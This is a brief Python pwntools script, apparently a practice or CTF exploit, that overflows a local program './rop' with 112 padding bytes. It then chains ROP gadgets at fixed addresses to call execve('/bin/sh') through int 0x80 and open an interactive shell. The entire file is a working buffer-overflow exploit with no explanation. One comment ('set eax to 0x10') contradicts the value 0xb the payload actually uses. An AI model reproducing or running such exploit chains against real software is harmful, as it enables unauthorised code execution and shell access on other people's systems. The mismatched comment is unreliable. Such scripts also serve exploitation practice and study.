#!/usr/bin/env python
from pwn import *

sh = process('./rop')

# set eax to 0x10
pop_eax_ret = 0x080bb196

# set ebx to address('/bin/sh')
# set ecx to 0x00
# set edx to 0x00
pop_edx_ecx_ebx_ret = 0x0806eb90

# 0x80 interrupt
int_0x80 = 0x08049421

# '/bin/sh'
binsh = 0x080be408

payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])

print(hexdump(payload))
 
sh.sendline(payload)
sh.interactive()
